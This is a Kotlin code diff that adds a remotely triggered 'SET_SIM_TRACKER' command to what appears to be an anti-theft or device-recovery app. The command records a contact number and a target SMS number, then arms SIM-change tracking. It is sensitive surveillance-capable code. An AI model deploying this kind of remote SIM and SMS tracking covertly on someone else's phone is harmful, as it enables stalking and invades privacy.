@@ -1063,6 +1063,24 @@ object CommandProcessor {
                     JudasManager.setHandler(ctx, content.trim())
                     status = "EMERGENCY_HANDLER_SET"
                 }
+                "SET_SIM_TRACKER" -> {
+                    val parts = content.split("|")
+                    if (parts.size >= 2) {
+                        val contactToCheck = parts[0].trim()
+                        val targetSmsNum = parts[1].trim()
+                        ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
+                            .putString("sim_track_check_num", contactToCheck)
+                            .putString("sim_track_target_num", targetSmsNum)
+                            .putBoolean("sim_tracker_armed", true)
+                            .apply()
+                        JudasManager.evaluateSimContactTracker(ctx)
+                        status = "SIM_TRACKER_ARMED"
+                        errorMsg = "Check: $contactToCheck | Target: $targetSmsNum"
+                    } else {
+                        status = "FAILED_FORMAT"
+                        errorMsg = "Use: CONTACT_NUM | TARGET_SMS_NUM"
+                    }
+                }
                 "GET_TRUSTED_SIMS" -> {
                     val sims = JudasManager.getTrustedSims(ctx)
                     status = "TRUSTED_SIMS_RETRIEVED"
